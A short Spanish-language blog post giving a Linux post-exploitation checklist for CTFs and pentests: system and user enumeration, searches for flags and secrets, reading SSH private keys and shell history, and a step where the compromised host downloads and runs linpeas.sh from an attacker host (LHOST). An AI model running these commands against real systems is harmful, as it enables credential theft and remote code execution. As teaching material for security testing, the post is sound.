---
layout: post
title: "Post-Explotación en Linux: Qué Hacer Tras Entrar"
read_time: ""
date: 2026-03-25
tags: [linux, postexplotacion, reconocimiento, lateral, persistencia]
description: "Checklist de acciones tras obtener acceso a un sistema Linux en un CTF o pentest."
---

Ya tienes shell. ¿Y ahora qué? Este es mi checklist habitual.

## Enumeración del sistema

```bash
uname -a
cat /etc/os-release
hostname
id && whoami
ip a
```

## Usuarios y grupos

```bash
cat /etc/passwd
cat /etc/group
ls /home/
last
who
```

## Archivos interesantes

```bash
find / -name "*.txt" 2>/dev/null | grep -i "flag\|pass\|cred\|secret"
find / -perm -4000 2>/dev/null   # SUID
sudo -l
crontab -l && cat /etc/crontab
```

## Historial y credenciales

```bash
cat ~/.bash_history
cat ~/.ssh/id_rsa
find / -name "config" -o -name ".env" 2>/dev/null
```

## Transferir herramientas

```bash
# Desde Kali
python3 -m http.server 8080

# En víctima
wget http://LHOST:8080/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```
